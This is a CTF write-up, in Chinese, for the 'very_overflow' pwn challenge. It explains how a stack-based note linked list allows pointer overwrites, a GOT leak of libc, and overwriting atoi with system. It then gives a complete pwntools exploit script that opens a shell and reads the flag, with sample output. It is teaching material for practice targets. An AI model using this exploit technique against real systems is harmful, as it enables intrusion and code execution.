# PHM #74 Pwn — very_overflow

| 項目 | 值 |
|:---|:---|
| 類別 | Pwn |
| 分數 | 200 |
| 保護 | No PIE / No canary / NX on / **Partial RELRO** (GOT 可寫) |
| Flag | `FLAG{Oops, heap on the stack is overflow!...dM6eCJOXLXiI0hSK}` |

## 題目

> `nc ctf.hackme.quest 7705`, Source: [`/static/very_overflow.c`](https://ctf.hackme.quest/static/very_overflow.c)

> [!NOTE]
> 一個 note 系統: add / edit / show / dump. Note 用 `struct NOTE { NOTE* next; char data[128]; }` 當 linked list, 128 個 struct 疊在 `vuln()` 的 stack 上.

## 分析 — Analysis

### 1. `add_note` 讓 next 指向 data 內部, 多個 note 擠在同一塊 buffer 裡

```c
void add_note(struct NOTE *node) {
    while (node->next && node->data[0]) { node = node->next; id++; }
    fgets(node->data, 128, stdin);
    node->next = (NOTE*)(node->data + strlen(node->data) + 1);  // ← 核心漏洞
    node->next->data[0] = '\0';
}
```

輸入短的 string → `next` 落在同一塊 `data[]` 內部. 連 add 3 次 "A","B","C" (每個 strlen=2), node 排在 buf[0]+0, +7, +14, 每一塊共用底層 128-byte buffer.

### 2. `edit_note` 不會更新 `next`, 但寫 128 bytes 覆蓋鄰居的 `next`

```c
void edit_note(struct NOTE *node) {
    ...
    fgets(node->data, sizeof(node->data), stdin);  // 128 bytes, 不碰 next
}
```

Node 0 的 `data` 範圍 (buf[0]+4 .. buf[0]+131) 包含了 node 1 的 `next` 欄位 (buf[0]+7..+10). 所以 `edit(0, b'XXX' + p32(target))` 就把 **node 1 的 next 改成 target**.

接著 `find_node_by_id(2)` 走 node 0 → node 1 → `*(node 1 + 0) = target`, **回傳一個把 target 當 `NOTE*`** 的指標. 之後 `show/edit` 就是對 target 做任意 read/write.

### 3. `print_note` 直接印 `next` → 任意 read

`show(2)` 流程下 → `print_note(target, 2)` → `printf("Next note: %p\n", target->next)` → 印出 `*(target)` 當 pointer. 把 target 設成 `GOT[puts]` 就印出 **libc puts 的位址**, 推出 libc base.

### 4. `edit_note` 寫到 `node->data` → 任意 write

Target 設成 `GOT[atoi] - 4` (因為 data 是 struct 的 offset +4). `edit(2, p32(system))` 把 `system` 寫到 `GOT[atoi]`.

### 5. Trigger — `read_integer` 的 `atoi` 變 `system`

```c
int read_integer() {
    char buff[8];
    fgets(buff, sizeof(buff) - 1, stdin);  // ← 讀 7 bytes = 6 char + \0
    return atoi(buff);                      // ← PLT → GOT → system (overwrite 之後)
}
```

下個 menu prompt 輸入 `sh` (2 char) → `system("sh")` 開 shell. **後面的 stdin 都被 inner shell 讀走**, 可以塞一行 shell command (`cat /home/ctf/flag; exit`).

> [!WARNING]
> `fgets` limit 7 讓 argument 只能 6 char + \0. 試 `"/bin/sh"` (7 char) 會被截成 `/bin/s`, 噴 `/bin/s: not found`. `sh` (2 char) 剛好夠, 開完 shell 再送指令.

## 解法 — Exploit

```python
from pwn import process, remote, context, ELF, p32
import sys, time

context.log_level = 'error'; context.arch = 'i386'
REMOTE = len(sys.argv) > 1 and sys.argv[1] == 'remote'
libc = ELF('./libc-2.23.so.i386') if REMOTE else ELF('/lib32/libc.so.6')
p = remote('ctf.hackme.quest', 7705) if REMOTE else process('./very_overflow')

GOT_PUTS = 0x0804a014
GOT_ATOI = 0x0804a02c

def menu(a):
    p.recvuntil(b'Your action:'); p.sendline(str(a).encode())
def add(d):
    menu(1); p.recvuntil(b'Input your note:'); p.sendline(d); p.recvuntil(b'id is'); p.recvline()
def edit(i, d):
    menu(2); p.recvuntil(b'Which note to edit:'); p.sendline(str(i).encode())
    p.recvuntil(b'Your new data:'); p.sendline(d); p.recvuntil(b'Done!')
def show(i):
    menu(3); p.recvuntil(b'Which note to show:'); p.sendline(str(i).encode())
    p.recvuntil(b'Next note: '); n = int(p.recvline().strip(), 16)
    p.recvuntil(b'Note data: '); d = p.recvline().strip()
    return n, d

# 1) 3 個短 note 排在 buf[0] 開頭連成一條鏈 (每個 7 bytes)
add(b'A'); add(b'B'); add(b'C')

# 2) 改 node 1 的 next = GOT[puts] → show(2) 印 *(GOT[puts]) = libc puts
edit(0, b'X'*3 + p32(GOT_PUTS))
puts_libc, _ = show(2)
libc_base   = puts_libc - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']

# 3) 改 node 1 的 next = GOT[atoi] - 4, edit(2) 把 system 寫進 GOT[atoi]
edit(0, b'X'*3 + p32(GOT_ATOI - 4))
edit(2, p32(system_addr))

# 4) 下個 menu 送 "sh" → system("sh") 開 shell, 之後 stdin 給 inner shell
p.recvuntil(b'Your action:')
p.sendline(b'sh')
p.sendline(b'cat /home/ctf/flag; exit')
time.sleep(1)
print(p.recvall(timeout=3).decode(errors='replace'))
```

```
[+] libc base = 0xf7d59000
[+] system    = 0xf7d93d80
[+] GOT[atoi] -> system
FLAG{Oops, heap on the stack is overflow!...dM6eCJOXLXiI0hSK}
```

## Sources

- [PHM scoreboard — very_overflow](https://ctf.hackme.quest/scoreboard/?id=74)
- `/static/very_overflow`, `/static/very_overflow.c`
